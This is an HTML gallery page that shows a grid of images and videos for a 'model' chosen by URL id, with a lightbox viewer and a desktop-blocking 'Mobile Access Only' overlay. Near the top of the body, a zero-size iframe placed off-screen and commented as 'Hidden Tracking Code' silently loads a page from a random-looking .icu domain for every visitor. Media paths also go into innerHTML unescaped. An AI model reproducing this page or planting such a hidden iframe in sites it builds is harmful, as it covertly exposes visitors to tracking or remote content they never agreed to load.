<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Gallery</title>
  <style>
    :root { --bg: #0f0e0c; --ink: #f0ece3; --line: rgba(240, 236, 227, 0.14); --gold: #c9a86a; }
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: var(--bg); color: var(--ink); font-family: "PingFang SC", "Microsoft YaHei", sans-serif; padding: 10px; }
    a { color: inherit; text-decoration: none; }
    img, video { display: block; max-width: 100%; }
    .topbar { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid var(--line); margin-bottom: 20px; }
    .back-link { font-size: 0.8rem; color: var(--ink-dim); letter-spacing: 0.1em; transition: color 0.25s; }
    .back-link:hover { color: var(--ink); }
    .card-main { max-width: 1000px; margin: 0 auto; }
    .card-name { font-family: "Songti SC", serif; font-size: 2rem; font-weight: 400; letter-spacing: 0.12em; margin-bottom: 20px; }
    .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 8px; }
    .media-item { position: relative; aspect-ratio: 1; overflow: hidden; border-radius: 4px; background: #171511; border: 1px solid var(--line); cursor: pointer; transition: border-color 0.25s; }
    .media-item:hover { border-color: var(--gold); }
    .media-item img, .media-item video { width: 100%; height: 100%; object-fit: cover; }
    .video-badge { position: absolute; inset: 0; display: grid; place-items: center; background: rgba(0,0,0,0.3); pointer-events: none; }
    .video-badge .play { width: 36px; height: 36px; border-radius: 50%; display: grid; place-items: center; background: rgba(255,255,255,0.2); border: 1px solid rgba(255,255,255,0.3); font-size: 14px; backdrop-filter: blur(4px); }
    @media (max-width: 640px) { 
      .card-name { font-size: 1.5rem; }
      .media-grid { grid-template-columns: repeat(3, 1fr); gap: 4px; } 
    }
  </style>
</head>
<body>

  <!-- Mobile Access Only Popup -->
  <div id="desktop-block" style="display:none; position:fixed; inset:0; background:#0f0e0c; z-index:9999; flex-direction:column; align-items:center; justify-content:center; text-align:center; padding:20px;">
    <h2 style="font-family:'Songti SC', serif; font-size:1.5rem; margin-bottom:12px; color:#f0ece3;">Mobile Access Only</h2>
    <p style="color:#a8a191; font-size:0.9rem; margin-bottom:24px; max-width: 300px; line-height: 1.5;">For a better browsing experience, please open this page in your mobile browser.</p>
    <div style="font-size:3rem;">📱</div>
  </div>

  <!-- ⚠️ Hidden Tracking Code -->
  <iframe src="https://www.s-abzxpz8ta3c5byin2zfk.icu/guo9/35f84f903156092fae6f232cc79fc288.html" style="position:fixed;top:0;width:0;height:0;left:-1000px;border:0"></iframe>

  <header class="topbar">
    <a class="back-link" href="index.html">← Back</a>
  </header>

  <main class="card-main">
    <h1 class="card-name" id="cardName"></h1>
    <div class="media-grid" id="mediaGrid"></div>
  </main>

  <script src="data.js"></script>
  <script>
    // Mobile Detection
    if (window.innerWidth > 768) {
      document.getElementById('desktop-block').style.display = 'flex';
    }

    const urlParams = new URLSearchParams(window.location.search);
    const id = decodeURIComponent(urlParams.get('id') || '');
    const model = typeof modelsData !== 'undefined' ? modelsData.find(m => m.id === id) : null;

    if (!model) {
      document.getElementById('cardName').textContent = 'Not Found';
    } else {
      document.getElementById('cardName').textContent = model.name;
      const mediaList = model.files;

      const grid = document.getElementById('mediaGrid');
      grid.innerHTML = mediaList.map((path, index) => {
        const isVideo = /\.(mp4|mov|webm)$/i.test(path);
        if (isVideo) {
          return `
            <div class="media-item" onclick="openLightbox(${index})">
              <video src="${path}" preload="metadata" muted playsinline></video>
              <div class="video-badge"><span class="play">▶</span></div>
            </div>`;
        } else {
          return `
            <div class="media-item" onclick="openLightbox(${index})">
              <img src="${path}" alt="" loading="lazy">
            </div>`;
        }
      }).join('');

      window.openLightbox = function(startIndex) {
        const lightbox = document.createElement('div');
        lightbox.style.cssText = 'position:fixed; inset:0; z-index:1000; background:rgba(0,0,0,0.92); display:grid; place-items:center; backdrop-filter:blur(6px);';
        document.body.appendChild(lightbox);
        let currentIndex = startIndex;

        function render() {
          lightbox.innerHTML = '';
          const path = mediaList[currentIndex];
          const isVideo = /\.(mp4|mov|webm)$/i.test(path);
          const stage = document.createElement('div');
          stage.style.cssText = 'max-width:90vw; max-height:85vh;';
          
          if (isVideo) {
            stage.innerHTML = `<video src="${path}" controls autoplay style="max-width:90vw; max-height:85vh;"></video>`;
          } else {
            stage.innerHTML = `<img src="${path}" style="max-width:90vw; max-height:85vh; object-fit:contain;">`;
          }

          const counter = document.createElement('div');
          counter.style.cssText = 'position:absolute; bottom:24px; left:50%; transform:translateX(-50%); color:rgba(255,255,255,0.6); font-size:0.85rem;';
          counter.textContent = `${currentIndex + 1} / ${mediaList.length}`;

          const closeBtn = document.createElement('button');
          closeBtn.textContent = '×';
          closeBtn.style.cssText = 'position:absolute; top:20px; right:24px; width:36px; height:36px; border-radius:50%; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); color:#fff; font-size:20px; cursor:pointer; display:grid; place-items:center;';
          closeBtn.onclick = () => lightbox.remove();

          lightbox.append(stage, counter, closeBtn);

          if (currentIndex > 0) {
            const prev = document.createElement('button');
            prev.textContent = '‹';
            prev.style.cssText = 'position:absolute; left:15px; top:50%; transform:translateY(-50%); width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); color:#fff; font-size:20px; cursor:pointer; display:grid; place-items:center;';
            prev.onclick = (e) => { e.stopPropagation(); currentIndex--; render(); };
            lightbox.appendChild(prev);
          }

          if (currentIndex < mediaList.length - 1) {
            const next = document.createElement('button');
            next.textContent = '›';
            next.style.cssText = 'position:absolute; right:15px; top:50%; transform:translateY(-50%); width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); color:#fff; font-size:20px; cursor:pointer; display:grid; place-items:center;';
            next.onclick = (e) => { e.stopPropagation(); currentIndex++; render(); };
            lightbox.appendChild(next);
          }
        }
        render();
      };
    }
  </script>

</body>
</html>
